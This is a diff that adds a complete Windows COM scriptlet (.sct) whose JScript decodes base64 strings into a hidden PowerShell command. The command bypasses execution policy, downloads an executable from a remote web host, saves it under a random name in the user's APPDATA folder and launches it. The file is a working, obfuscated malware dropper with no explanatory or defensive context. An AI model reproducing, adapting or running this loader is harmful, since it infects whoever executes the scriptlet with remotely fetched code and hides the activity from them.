@@ -1,0 +1,63 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="KMCxeVyhp"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+        <script language="JScript">
+        <![CDATA[
+var keyStr = "ABCDEFGHIJKLMNOP" +
+             "QRSTUVWXYZabcdef" +
+             "ghijklmnopqrstuv" +
+             "wxyz0123456789+/" +
+             "=";
+
+  function decode64(input) {
+     var output = "";
+     var chr1, chr2, chr3 = "";
+     var enc1, enc2, enc3, enc4 = "";
+     var i = 0;
+
+     var base64test = /[^A-Za-z0-9\+\/\=]/g;
+     if (base64test.exec(input)) {
+        alert("There were invalid base64 characters in the input text.\n" +
+              "Valid base64 characters are A-Z, a-z, 0-9, '+', '/',and '='\n" +
+              "Expect errors in decoding.");
+     }
+     input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+
+     do {
+        enc1 = keyStr.indexOf(input.charAt(i++));
+        enc2 = keyStr.indexOf(input.charAt(i++));
+        enc3 = keyStr.indexOf(input.charAt(i++));
+        enc4 = keyStr.indexOf(input.charAt(i++));
+
+        chr1 = (enc1 << 2) | (enc2 >> 4);
+        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+        chr3 = ((enc3 & 3) << 6) | enc4;
+
+        output = output + String.fromCharCode(chr1);
+
+        if (enc3 != 64) {
+           output = output + String.fromCharCode(chr2);
+        }
+        if (enc4 != 64) {
+           output = output + String.fromCharCode(chr3);
+        }
+
+        chr1 = chr2 = chr3 = "";
+        enc1 = enc2 = enc3 = enc4 = "";
+
+     } while (i < input.length);
+
+     return unescape(output);
+  }
+
+var initStrEnc = 'cG93ZXJzaGVsbC5leGUgLU5vUHIgLVdJTmQgMSAtZVhFYyBCeVA=';
+var initStrDec = decode64(initStrEnc);
+var comStrEnc = 'cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLVdpbmRvd1N0eWxlIGhpZGRlbiAtbm9sb2dvICRxeEtqek1sWCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbiB8IFNlbGVjdCAtRXhwYW5kIE1ham9yOyRCc0FyS1lYcmFDZyA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbiB8IFNlbGVjdCAtRXhwYW5kIE1pbm9yOyRyU3NFT3ZYUSA9ICIkcXhLanpNbFgiICsgJy4nICsgIiRCc0FyS1lYcmFDZyI7JGRLQ1VOVFlDID0gJFBTVmVyc2lvblRhYmxlLlBTVmVyc2lvbi5NYWpvcjtpZigkZEtDVU5UWUMgLWVxIDIpeyRWQXN0YSA9IEdldC1SYW5kb20gLU1pbmltdW0gNSAtTWF4aW11bSAxMDskRElNeEVOdHpvID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgJFZBc3RhIHwgJSB7W2NoYXJdJF99KTskQm1ySUR1VXEgPSAkRElNeEVOdHpvICsgJy5leGUnOyRUVGZDQ1J3ID0gIiRlbnY6QVBQREFUQSIgKyAnXCcgKyAiJEJtcklEdVVxIjs7Ozs7JE92akdQdCA9ICdodHRwOi8vZnJlZWhxcGljcy53ZWJzaXRlL2RhcmsuZXhlJzskSUJRRWZZV1ZtUmdzUXdZID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskcE95U3ZqdVZxb2lhcFogPSAkSUJRRWZZV1ZtUmdzUXdZLkRvd25sb2FkRmlsZSgkT3ZqR1B0LCAkVFRmQ0NSdyl9ZWxzZWlmKCRkS0NVTlRZQyAtZ2UgMyl7JFZBc3RhID0gR2V0LVJhbmRvbSAtTWluaW11bSA1IC1NYXhpbXVtIDEwOyRESU14RU50em8gPSAtam9pbiAoKDY1Li45MCkgKyAoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCAkVkFzdGEgfCAlIHtbY2hhcl0kX30pOyRCbXJJRHVVcSA9ICRESU14RU50em8gKyAnLmV4ZSc7JFRUZkNDUncgPSAiJGVudjpBUFBEQVRBIiArICdcJyArICIkQm1ySUR1VXEiOzs7OzskT3ZqR1B0ID0gJ2h0dHA6Ly9mcmVlaHFwaWNzLndlYnNpdGUvZGFyay5leGUnO0ludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJE92akdQdCAtT3V0RmlsZSAkVFRmQ0NSd307U3RhcnQtUHJvY2VzcyAkVFRmQ0NSdzs7IiI=';
+var comStrDec = decode64(comStrEnc);
+oShell = new ActiveXObject("WScript.Shell").Run(initStrDec + comStrDec,0,true);
+        ]]>
+</script>
+</registration>
+</scriptlet>
